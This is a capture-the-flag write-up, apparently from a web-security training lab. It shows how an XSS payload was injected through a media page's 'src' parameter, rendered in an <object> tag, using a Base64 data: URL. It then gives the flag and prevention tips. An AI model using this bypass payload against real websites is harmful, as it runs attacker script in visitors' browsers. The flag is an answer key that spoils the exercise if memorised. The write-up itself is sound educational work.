[README.md](../../../README.md)
# XSS injection media page
## Reconnaissance
On the website home page, only one image is clickable.
Clicking on it leads us to the following link: `http://x.x.x.x/?page=media&src=nsa`

Upon inspecting the page, we discover an `<object>` HTML tag, which is known for its potential vulnerability to XSS injection.

## Exploit
By manipulating the `src` parameter in the URL, we attempt to launch an attack.

The following URL does not work and returns an error:
`http://x.x.x.x/?page=media&src=<script>alert(1)</script>`

This is likely because the URL does not support special characters like `/`.

To overcome this, we attempt to encode the URL in Base64:
- `<script>alert(1)</script>` -> `PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`

The modified URL does not work either:
`http://x.x.x.x/?page=media&src=bW9kdWxlPSJtZWRpYSZzcmM9PGJvZHk%2BYWxlcnQoMSk8L2JvZHk%2B`


To proceed, we add the following part to the URL to indicate that the subsequent content is encoded in Base64: `data:text/html;base64`
This gives us the working URL:: `http://x.x.x.x/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`


**Flag:**
```
THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
```
## Prevention
- Do not use the `<object>` HTML tag.
- Input sanitization mechanics to filter out malicious content.
- Content Security Policy (CSP) headers

See: [XSS Prevention](../../xss_feedback/Resources/xss_feedback.md#prevention)